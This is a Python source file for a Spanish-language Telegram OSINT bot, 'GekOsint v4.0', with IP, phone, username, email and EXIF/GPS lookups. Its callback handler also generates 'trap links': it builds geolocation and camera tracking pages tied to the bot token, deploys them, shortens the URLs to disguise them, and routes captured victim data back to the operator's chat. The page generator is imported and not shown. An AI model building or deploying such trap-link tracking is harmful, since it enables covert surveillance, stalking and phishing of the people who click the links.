
from telegram import Update
from telegram.ext import ContextTypes
from ui.menus import main_menu, back_btn
from ui.templates import format_ip_result, format_phone_result, format_username_result, format_email_result
from modules.ip_lookup import get_ip_info
from modules.phone_lookup import analyze_phone
from modules.username_search import search_username
from modules.email_analysis import analyze_email
from modules.tracking import generate_tracking_page
from modules.exif_extract import get_exif
from utils.apis import deploy_html, shorten_url
from config import BOT_TOKEN, logger

# --- Command Handlers ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user.first_name
    txt = (
        f"👨‍💻 <b>Bienvenido, {user}</b>\n\n"
        f"Sistema <b>GekOsint v4.0</b> iniciado.\n"
        f"Seleccione un módulo de inteligencia:"
    )
    if update.callback_query:
        await update.callback_query.edit_message_text(txt, reply_markup=main_menu(), parse_mode='HTML')
    else:
        await update.message.reply_text(txt, reply_markup=main_menu(), parse_mode='HTML')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)

# --- Callback Handler ---
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == 'start':
        await start(update, context)
        return

    prompts = {
        'menu_ip': "📡 <b>IP Lookup</b>\nEnvía la dirección IP a investigar:",
        'menu_phone': "📱 <b>Phone Intel</b>\nEnvía el número con código de país (ej: +52...):",
        'menu_user': "👤 <b>User Search</b>\nEnvía el username a rastrear:",
        'menu_email': "📧 <b>Email Check</b>\nEnvía el correo electrónico:",
        'menu_exif': "📂 <b>EXIF Data</b>\nEnvía una foto como <b>DOCUMENTO</b> (sin compresión).",
        'menu_about': "ℹ️ <b>GekOsint v4.0</b>\nDesarrollado para investigación ética.\nUso responsable."
    }

    if data in prompts:
        context.user_data['mode'] = data
        await query.edit_message_text(prompts[data], reply_markup=back_btn(), parse_mode='HTML')
    
    # Manejo especial para trackers (acciones inmediatas)
    elif data in ['menu_geo', 'menu_cam']:
        await query.edit_message_text("⚙️ <b>Generando Enlace Trampa...</b>", parse_mode='HTML')
        
        type_ = "geo" if data == 'menu_geo' else "cam"
        fname, html = generate_tracking_page(BOT_TOKEN, query.message.chat_id, type_)
        
        # Deploy
        url = deploy_html(html, fname)
        if url:
            short = shorten_url(url)
            msg = (
                f"✅ <b>Enlace Generado ({type_.upper()})</b>\n\n"
                f"🔗 <code>{short}</code>\n\n"
                f"⚠️ <i>La información capturada llegará a este chat.</i>"
            )
            await context.bot.send_message(query.message.chat_id, msg, parse_mode='HTML', reply_markup=back_btn())
        else:
            await context.bot.send_message(query.message.chat_id, "❌ Error al subir archivo. Intenta de nuevo.", reply_markup=back_btn())

# --- Message Handler ---
async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    mode = context.user_data.get('mode')
    text = update.message.text
    
    if not mode:
        return # Ignorar mensajes sin contexto

    msg = await update.message.reply_text("⏳ <b>Procesando...</b>", parse_mode='HTML')
    
    try:
        response = "Error desconocido"
        
        if mode == 'menu_ip':
            data = get_ip_info(text.strip())
            response = format_ip_result(data)
            
        elif mode == 'menu_phone':
            data = analyze_phone(text.strip())
            response = format_phone_result(data)
            
        elif mode == 'menu_user':
            found = search_username(text.strip())
            response = format_username_result(text, found)
            
        elif mode == 'menu_email':
            data = analyze_email(text.strip())
            response = format_email_result(data)

        await msg.edit_text(response, parse_mode='HTML', disable_web_page_preview=True, reply_markup=back_btn())
        
    except Exception as e:
        logger.error(e)
        await msg.edit_text(f"❌ Error: {str(e)}", reply_markup=back_btn())

# --- Document Handler (EXIF) ---
async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get('mode') != 'menu_exif': return
    
    msg = await update.message.reply_text("⏳ <b>Descargando y analizando...</b>", parse_mode='HTML')
    
    try:
        f = await update.message.document.get_file()
        byte_array = await f.download_as_bytearray()
        
        data = get_exif(bytes(byte_array))
        
        if not data:
            await msg.edit_text("❌ No se encontraron metadatos EXIF.", reply_markup=back_btn())
            return

        # Formatear respuesta EXIF aquí directamente por simplicidad
        txt = "📂 <b>METADATOS ENCONTRADOS</b>\n\n"
        txt += f"📷 <b>Dispositivo:</b> {data['device'].get('Model', 'N/A')}\n"
        txt += f"📅 <b>Fecha:</b> {data['device'].get('DateTimeOriginal', 'N/A')}\n"
        
        if "coords" in data:
            txt += f"\n📍 <b>GPS Detectado!</b>\n"
            txt += f"🔗 <a href='{data['map']}'>Ver Ubicación</a>\n"
        else:
            txt += "\n⚠️ Sin datos GPS.\n"
            
        await msg.edit_text(txt, parse_mode='HTML', reply_markup=back_btn())
        
    except Exception as e:
        await msg.edit_text(f"❌ Error procesando imagen: {e}", reply_markup=back_btn())
